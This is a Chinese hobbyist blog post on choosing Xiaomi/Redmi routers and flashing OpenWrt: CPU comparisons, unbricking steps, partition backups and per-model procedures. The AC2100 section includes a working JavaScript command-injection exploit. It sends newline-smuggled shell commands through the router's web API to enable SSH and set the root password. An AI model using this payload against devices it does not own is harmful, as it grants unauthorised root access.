---
title: openwrt刷机
date: 2022-02-13 01:18:16
tags: [openwrt, 如何实现网络自由, 折腾]
---

## Openwrt硬件选择

如何选择一个可以刷openwrt的路由器？

- [老房子WiFi布网攻略 篇三十八：WiFi 6 梅林或openwrt固件路由器入手指南_路由器_什么值得买 (smzdm.com)](https://post.smzdm.com/p/awznd6qg/)
- [老房子WiFi布网攻略 篇二十四：不漏油的路由器不是好矿机，矿渣路由器盘点_路由器_什么值得买 (smzdm.com)](https://post.smzdm.com/p/apzkqlrx/)
- 极路由、新路由：[机皇！几种高性价比矿渣路由器比较-新手入门及其它(硬件)-恩山无线论坛 (right.com.cn)](https://www.right.com.cn/forum/thread-8097191-1-1.html)
###  小米路由器型号总结

#### CPU分类

- mt7621型号
  - R3G：咸鱼50元左右，有USB3.0接口，128MB的flash。
  - 4A千兆版：咸鱼70元左右，外观简约漂亮，16MB NOR flash有点小。
  - C660x：咸鱼100多，支持wifi6
- 高通型号
  - **目前(22.03)只有AX6S是受openwrt官方支持的**，AX6, AX3600有第三方支持。AX5等其余未支持
    - 不能刷好像是linux kernel还不支持高通的IPQ SoC。
    - B站看到说AX5刷openwrt需要硬改内存为1G，好像说高通的wifi驱动非常耗内存
  - AX6S：220左右
  - AX6：250-300左右

#### 小米系列产品

- 红米AX5，小米AX1800换皮
  - IPQ6000, 4核A53@1.2Ghz：[[OpenWrt Wiki\] Xiaomi AX1800 (AX5/RA67)](https://openwrt.org/inbox/toh/xiaomi/xiaomi_ax1800)

- **红米AX6**，小米AX3600换皮
  - AX6, **IPQ8071A**@1.4GHz, 512(ram) + 128：[[OpenWrt Wiki] Xiaomi Redmi AX6 Wi-Fi 6 Mesh Router](https://openwrt.org/inbox/toh/xiaomi/xiaomi_redmi_ax6_ax3000)
  - AX3600, IPQ8071A, 512 + 256：[[OpenWrt Wiki] Xiaomi AX3600](https://openwrt.org/inbox/toh/xiaomi/xiaomi_ax3600)
  - 对比：[红米AX6拆机，旧款WIFI6无线路由器-路由器交流 (acwifi.net)](https://www.acwifi.net/11176.html)
- AX3000
  - **红米AX3000（比较常见）**，IPQ5000：双核A53@1.0GHz, 256(ram) + 128：[Redmi路由器AX3000立即购买-小米商城](https://www.mi.com/shop/buy/detail?product_id=14538)
  - 小米AX3000：IPQ5000：双核A53@1.0GHz, 256(ram) + 128：[小米路由器AX3000立即购买-小米商城 (mi.com)](https://www.mi.com/shop/buy/detail?product_id=14790)
  - 红米AX3000模具和AX6S一样，为白色。小米AX3000为黑色四棱柱。
- AX5400
  - 红米AX5400，IPQ5018：双核A53@1.0GHz，512(ram) + 128：[红米AX5400千兆版拆机，看看与电竞版有什么差别-路由器交流 (acwifi.net)](https://www.acwifi.net/19451.html)
- AX6000
  - 小米AX6000
    - IPQ5018, 2核A53@1.0Ghz, 512(ram) + 128
    - 使用的SoC IPQ5018为高通沉浸式家庭联网平台，不如高通专业联网平台的IPQ8071A（AX3600上的）
  - **红米AX6000（很强）**
    - **MT7986A**, 4核A53@2.0Ghz, 512(ram) + 128：[[OpenWrt Wiki\] Xiaomi Redmi AX6000](https://openwrt.org/toh/xiaomi/redmi_ax6000)
    - [红米AX6000拆机，最便宜的四核2.0GHz-路由器交流 (acwifi.net)](https://www.acwifi.net/19676.html)

![image-20221029213022447](https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/picgo/image-20221029213022447.png)

参考

- [(33 封私信 / 71 条消息) 路由器红米ax3000和红米ax6选择哪个? - 知乎 (zhihu.com)](https://www.zhihu.com/question/474579126)
- 小米openwrt页面：[[OpenWrt Wiki] Xiaomi](https://openwrt.org/toh/hwdata/xiaomi/start)

- 常见MediaTek SoC：[MediaTek - WikiDevi.Wi-Cat.RU](https://wikidevi.wi-cat.ru/MediaTek)

### CPU对比

参考：

- [[转贴\] 无线路由器CPU浅析 MT7621A、 BCM47189 到底谁强？-新手入门及其它(硬件)-恩山无线论坛 (right.com.cn)](https://www.right.com.cn/forum/thread-216888-1-1.html)

- 树莓派系列处理器：[Raspberry Pi Documentation - Processors](https://www.raspberrypi.com/documentation/computers/processors.html)
  - Raspberry Pi 2 Model B： BCM2836(quad-core Cortex-A7 )
  - Raspberry Pi 3 Model B：BCM2837( quad-core Cortex-A53@1.2)
    - 50% faster than the Raspberry Pi 2.
  - Raspberry Pi 3 Models A+, B+: BCM2837B0(quad-core Cortex-A53@1.4)
    - 17% faster than the original Raspberry Pi 3
  - Raspberry Pi 4 Model B: BCM2837(quad-core Cortex-A72@1.5 GHz)
    - 50% faster than the Raspberry Pi 3B+

- ARM核对比：[List of ARM processors - Wikipedia](https://en.wikipedia.org/wiki/List_of_ARM_processors)
  - Cortex-A7: 1.9 DMIPS/MHz per core
  - A53: 2.3 DMIPS/MHz
  - A72: 6.3-7.3 DMIPS/MHz
- MIPS核：[MIPS Classic Processor Cores - Imagination Technologies](https://www.mips.com/products/classic/)
  - 1004K: 1.6 DMIPS/MHz
- 74k: 1.93 DMIPS/MHz：CSAC路由器：71
  
- [newifi3-d2-firmware/README.md at master · sawaYch/newifi3-d2-firmware (github.com)](https://github.com/sawaYch/newifi3-d2-firmware/blob/master/README.md)


## 刷机过程总结

以红米AC2100可能的刷机为例，涵盖了openwrt的各种情况：刷breed，恢复，临时镜像

- **建议直接使用官方openwrt镜像 + 官方安装方式。几次使用breed都遇到了问题，而小米官方恢复工具也挺好用的。**

- 第一次自己刷机红米AC2100[[记录红米AC2100折腾]]，一张精华图

  ![image-20210622145337241](https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/picgo/image-20210622145337241.png)

- 路由器刷出问题，修复经验。知道了备份的重要性[[记录记一次路由器刷出问题修复过程]]

## 小米路由器救砖

### 有官方bootloader的情况

**说明：**

官方的引导程序使用的是uboot，位于flash的Bootloader分区，而官方固件则位于OS1分区（红米AC2100）。正常刷openwrt的过程中不会修改bootloader。只要还保留着官方bootloader，就可以通过官方修复工具恢复。

**步骤：**

1. 下载`小米路由器修复工具`和官方镜像：[【下载汇总】客户端/ROM下载 - 小米社区 (xiaomi.cn)](https://www.xiaomi.cn/post/19184644)
2. **路由器通电**，PC通过网线连接到路由器LAN口
3. 打开`MIWIFIRepairTool.x86.exe`
4. 选择镜像
5. **选择网卡**（可以在网络中心中将其它网卡禁用）
6. 断开路由器电源，按住rst键（也有可能需要用针戳），然后接上电源，等待黄灯闪烁（两个灯，一个是有电源标志，一个有互联网标志，这里为电源灯那个）
7. 软件自动上传镜像
8. 保持耐心等待路由器黄灯变蓝（中间过程保持黄灯），**亲测需要4分钟**
9. 断电后重新接上电源，路由器重启

### 刷了breed

**说明：**

breed自身便是一个bootloader，刷完breed后会覆盖原本的bootloader。如果想复原，可通过breed的功能，重新刷回官方bootloader。**强烈建议刷breed前，先备份原本的bootloader以及整个flash**。如果没备份，这里是恩山上收集的**小米官方bootloader下载**：[论坛收集的几个小米路由器官方bootloader - 恩山无线论坛](https://www.right.com.cn/forum/thread-4102208-1-1.html)

**步骤：**

1. 通过breed刷回官方bootloader
2. 通过官方修复工具修复

## 常用操作

### snapshot的说明

snapshot是开发版分支

- 默认没有安装luci（没有网页界面）
- 上游每天都会编译产生新的snapshot。对于kernel mod相关软件，不是同一次编译则无法安装。
- [[OpenWrt Wiki\] Installing OpenWrt development snapshots](https://openwrt.org/docs/guide-quick-start/developmentinstallation)

### 命令行安装sysupgrade.bin

- [[OpenWrt Wiki\] Upgrading OpenWrt firmware using CLI](https://openwrt.org/docs/guide-user/installation/sysupgrade.cli)

```
sysupgrade -v /tmp/firmware_image.bin

#If sysupgrade is not available.
# Flash firmware
mtd -r write /tmp/firmware_image.bin firmware
```

### 备份恢复 CLI

- 官方：[[OpenWrt Wiki\] Backup and restore](https://openwrt.org/docs/guide-user/troubleshooting/backup_restore)

自己实现了一个自动配置openwrt脚本

- [TheRainstorm/my-openwrt-config (github.com)](https://github.com/TheRainstorm/my-openwrt-config)

### 性能测试

#### iperf3

| 说明             | 连接            | src       | dst   | speed(Mb/s) |
| ---------------- | --------------- | --------- | ----- | ----------- |
| ax6s LAN2LAN     | 千兆USB网卡     | tianyi310 | ax6s  | 941         |
| ax6s wifi        | wifi6 5Ghz@1201 | s3pro     | ax6s  | 626         |
| r4a LAN2LAN      | 2.5G网卡        | ryzen     | r4a   | 470         |
| r4a-ax6s vpn2vpn |                 | tianyi310 | ryzen | 118         |
| r4a to ax6s      |                 | r4a       | ax6s  | 136         |
| ax6s to r4a      |                 | ax6s      | r4a   | 149         |

## 具体型号刷机过程

### Redmi AC2100刷Openwrt

#### 1. 确认stock系统版本

确认系统版本是否为2.0.23，如果不是，则在系统内手动升级到该版本http://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/rm2100/miwifi_rm2100_all_fb720_2.0.23.bin

#### 2. 获得ssh

使用web漏洞，获得ssh

```js
// Work for RedMi 2100 firmware 2.0.23
// http://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/rm2100/miwifi_rm2100_all_fb720_2.0.23.bin

function getSTOK() {
    let match = location.href.match(/;stok=(.*?)\//);
    if (!match) {
        return null;
    }
    return match[1];
}

function execute(stok, command) {
    command = encodeURIComponent(command);
    let path = `/cgi-bin/luci/;stok=${stok}/api/misystem/set_config_iotdev?bssid=SteelyWing&user_id=SteelyWing&ssid=-h%0A${command}%0A`;
    console.log(path);
    return fetch(new Request(location.origin + path));
}

function enableSSH() {
    stok = getSTOK();
    if (!stok) {
        console.error('stok not found in URL');
        return;
    }
    console.log(`stok = "${stok}"`);

    password = prompt('Input new SSH password');
    if (!password) {
        console.error('You must input password');
        return;
    }

    execute(stok, 
`
nvram set ssh_en=1
nvram commit
sed -i 's/channel=.*/channel=\\"debug\\"/g' /etc/init.d/dropbear
/etc/init.d/dropbear start
`
    )
        .then((response) => response.text())
        .then((text) => console.log(text));
    console.log('New SSH password: ' + password);
    execute(stok, `echo -e "${password}\\n${password}" | passwd root`)
        .then((response) => response.text())
        .then((text) => console.log(text));
}

enableSSH();
```

#### 3. 下载openwrt镜像

从官方下载最新镜像，注意有四个文件

- kernel: 具有最少文件系统的Linux内核. 对于首次安装或恢复很有用.
- kernel1: Linux内核作为单独的映像
- rootfs0: 根文件系统作为单独的映像.
- Sysupgrade: 使用Sysupgrade映像更新已经运行OpenWrt的路由器. 该映像可以与LuCI Web界面或终端一起使用.

需要下载kernel1和rootfs0

- [OpenWrt Downloads](https://downloads.openwrt.org/)
- [OpenWrt Firmware Selector](https://firmware-selector.openwrt.org/)

#### 4. 备份

通过dmesg，知道一共有14个mtd分区

```
[    2.940000] NAND device: Manufacturer ID: 0xc8, Chip ID: 0xd1 (ESMT NAND 128MiB 3,3V 8-bit), 128MiB, page size: 2048, OOB size: 64
[    2.950000] [NAND]select ecc bit:4, sparesize :64 spare_per_sector=16
[    2.950000] Scanning device for bad blocks
[    3.100000] Signature matched and data read!
[    3.110000] load_fact_bbt success 1023
...
[    3.190000] Creating 14 MTD partitions on "MT7621-NAND":
[    3.190000] 0x000000000000-0x000007f80000 : "ALL"
[    3.200000] 0x000000000000-0x000000080000 : "Bootloader"
[    3.210000] 0x000000080000-0x0000000c0000 : "Config"
[    3.210000] 0x0000000c0000-0x000000100000 : "Bdata"
[    3.220000] 0x000000100000-0x000000140000 : "Factory"
[    3.230000] 0x000000140000-0x000000180000 : "crash"
[    3.230000] 0x000000180000-0x0000001c0000 : "crash_syslog"
[    3.240000] 0x0000001c0000-0x000000200000 : "cfg_bak"
[    3.240000] 0x000000200000-0x000000600000 : "kernel0"
[    3.250000] 0x000000600000-0x000000a00000 : "kernel1"
[    3.260000] 0x000000a00000-0x000002400000 : "rootfs0"
[    3.260000] 0x000002400000-0x000003e00000 : "rootfs1"
[    3.270000] 0x000003e00000-0x000006400000 : "overlay"
[    3.280000] 0x000006400000-0x000007f80000 : "obr"
[    3.280000] [mtk_nand] probe successfully!
```

通过cat /proc/mtd，知道对应关系

```
root@XiaoQiang:/tmp# cat /proc/mtd
dev:    size   erasesize  name
mtd0: 07f80000 00020000 "ALL"
mtd1: 00080000 00020000 "Bootloader"
mtd2: 00040000 00020000 "Config"
mtd3: 00040000 00020000 "Bdata"
mtd4: 00040000 00020000 "Factory"
mtd5: 00040000 00020000 "crash"
mtd6: 00040000 00020000 "crash_syslog"
mtd7: 00040000 00020000 "cfg_bak"
mtd8: 00400000 00020000 "kernel0"
mtd9: 00400000 00020000 "kernel1"
mtd10: 01a00000 00020000 "rootfs0"
mtd11: 01a00000 00020000 "rootfs1"
mtd12: 02600000 00020000 "overlay"
mtd13: 01b80000 00020000 "obr"
mtd14: 00c1c000 0001f000 "ubi_rootfs"
mtd15: 021e8000 0001f000 "data"
```

备份，其中Factory中存储了EEPROM的数据

```
cat /dev/mtd4 > Factory.dump
cat /dev/mtd3 > Bdata.dump

scp复制到本地
```

#### 5. 设置环境变量

设置环境变量（rm2100有双系统用于备份保护，需要设置先启动哪一个）

```bash
# Enable uart and boot_wait, useful for testing or recovery if you have an uart adapter!
nvram set uart_en=1
nvram set boot_wait=on
nvram set bootdelay=5

# Set kernel1 as the booting kernel
nvram set flag_try_sys1_failed=1

# Commit our nvram changes
nvram commit
```

#### 6. 刷机

```bash
mtd write kernel1.bin kernel1
mtd -r write rootfs0.bin rootfs0
```

### MI 4A千兆版

#### 说明

可以漏洞获取shell，不必使用硬件编程器

#### 步骤

1. 首先需要使用`OpenWRTInvasion`**获取shell**。参考：[acecilia/OpenWRTInvasion(github.com)](https://github.com/acecilia/OpenWRTInvasion)。

   同时，该仓库也提供了获得shell后的刷机过程。

   不过使用官方的`OpenWRTInvasion`会从github上下载文件，而因为网络原因可能会失败。恩山论坛中有用户提供了修改代码的离线版本，可以搜索使用。

   不过也可以自行修改代码：修改`script.sh`，将其中的链接替换成本地链接。可以使用python -m http.server运行一个小的http服务，提供下载。例：

   ```bash
   curl -L "https://github.com/acecilia/OpenWRTInvasion/raw/master/script_tools/busybox-mipsel" --insecure --output busybox
   
   #改为,ip需要调整
   curl "http://192.168.31.189:8000/busybox-mipsel" --output busybox
   ```

2. 参考仓库README，成功获得shell后，如图所示。接着上传镜像（initramfs-kernel.bin和squashfs-sysupgrade.bin都可以，推荐使用后者），然后运行mtd write（用cat /proc/mtd查看有哪些分区）
   ![image-20221030210955796](https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/picgo/image-20221030210955796.png)
   
3. 最后等待路由器重启完成即可。

#### 参考

breed使用说明：https://www.sohu.com/a/304140654_120096961

breed刷openwrt教程https://www.ixigua.com/6974624328725824031



### MI R3G

官方教程：[[OpenWrt Wiki\] Xiaomi Mi WiFi R3G (Mi Wifi Router 3G / MIR3G / MI3G / R4A Gigabit)](https://openwrt.org/toh/xiaomi/mir3g)

r3g官方固件下载：[OpenWrt Firmware Selector](https://firmware-selector.openwrt.org/?version=21.02.3&target=ramips%2Fmt7621&id=xiaomi_mi-router-3g)

#### 准备

- FAT32格式U盘
- 一枚针用于戳路由器reset键
- 手机安装MIWIFI app

#### 开启ssh

1. 更新为小米开发版固件：https://bigota.miwifi.com/xiaoqiang/rom/r3g/miwifi_r3g_firmware_12f97_2.25.124.bin

2. **下载小米路由器手机客户端(应用商店MI WIFI)软件，绑定路由器**

3. 根据https://d.miwifi.com/rom/ssh，开启SSH

   *p.s. 1. 即使是同一型号，miwifi_ssh.bin也是不同的；2. ssh密码显示在该页面*

   1. 请将下载的工具包bin文件复制到U盘（FAT/FAT32格式）的根目录下，保证文件名为miwifi_ssh.bin；
   2. 断开小米路由器的电源，将U盘插入USB接口；
   3. 按住reset按钮之后重新接入电源，指示灯变为黄色闪烁状态即可松开reset键；
   4. 等待3-5秒后安装完成之后，小米路由器会自动重启，之后您就可以尽情折腾啦 ：）

#### 备份

查看mtd分区

```
root@XiaoQiang:~# cat /proc/mtd
dev:    size   erasesize  name
mtd0: 07f80000 00020000 "ALL"
mtd1: 00080000 00020000 "Bootloader"
mtd2: 00040000 00020000 "Config"
mtd3: 00040000 00020000 "Bdata"
mtd4: 00040000 00020000 "Factory"
mtd5: 00040000 00020000 "crash"
mtd6: 00040000 00020000 "crash_syslog"
mtd7: 00040000 00020000 "reserved0"
mtd8: 00400000 00020000 "kernel0"
mtd9: 00400000 00020000 "kernel1"
mtd10: 02000000 00020000 "rootfs0"
mtd11: 02000000 00020000 "rootfs1"
mtd12: 03580000 00020000 "overlay"
mtd13: 012a6000 0001f000 "ubi_rootfs"
mtd14: 030ec000 0001f000 "data"
```

备份factory分区

```
cat /dev/mtd4 > /tmp/factory.bin

#on windows
scp root@192.168.33.193:/tmp/factory.bin .
scp root@192.168.33.228:/tmp/factory.bin .
```

#### 刷openwrt

```
mtd write openwrt-18.06.2-ramips-mt7621-mir3g-squashfs-kernel1.bin kernel1
mtd write openwrt-18.06.2-ramips-mt7621-mir3g-squashfs-rootfs0.bin rootfs0
nvram set flag_try_sys1_failed=1
nvram commit
reboot
```

### AX6S

AX6S为国内版，国外版称为AX3200
- SoC：**MT7622**B: 2 x A53@1.35GHz CPU。
  - 满血版本是MT7622A，少了蓝牙就是MT7622BV，没有蓝牙和多媒体功能的是MT7622B，基本剩下无线功能的是MT7622E
-  ram: 256 + flash: 128
- [[OpenWrt Wiki] Xiaomi AX3200 / Redmi AX6S](https://openwrt.org/toh/xiaomi/ax3200)

#### openwrt git分支

图中蓝色为master分支，绿色为21.02稳定版分支，橙色为LEDE19.07分支，而粉色的为新的22.03测试版分支。可以看到AX6S最早在master分支中得到支持，然后不久便在22.03中得到了添加。

- 好奇为何不使用merge

![image-20220802134158765](https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/picgo/image-20220802134158765.png)

21.02稳定版分支，当初也是从master分支中分离出来的

![image-20220802134945115](https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/picgo/image-20220802134945115.png)



##### immortal wrt

- [immortalwrt/immortalwrt: An opensource OpenWrt variant for mainland China users. (github.com)](https://github.com/immortalwrt/immortalwrt)

有以下这些分支。开发流程为将官方分支合并到自己的分支。但是21.02稳定版仍然没有AX6S的支持，网上看到的是18.06-k5.4分支的

- [AX6S 闭源无线驱动Openwrt 刷机教程/固件下载-小米无线路由器以及小米无线相关的设备-恩山无线论坛 (right.com.cn)](https://www.right.com.cn/forum/forum.php?mod=viewthread&tid=8187405)

```
* openwrt-21.02
  remotes/origin/HEAD -> origin/openwrt-21.02
  remotes/origin/master
  remotes/origin/openwrt-18.06
  remotes/origin/openwrt-18.06-k5.4
  remotes/origin/openwrt-21.02
```

![image-20220802142756560](https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/picgo/image-20220802142756560.png)

### 竞斗云2.0 

需要先刷入opboot（一个第三方bootloader）[竞斗云2刷opboot - 路由智态 (red-yellow.net)](https://www.red-yellow.net/竞斗云2刷opboot.html)

然后再刷openwrt。

比较担心opboot和opewrt最新版的兼容性。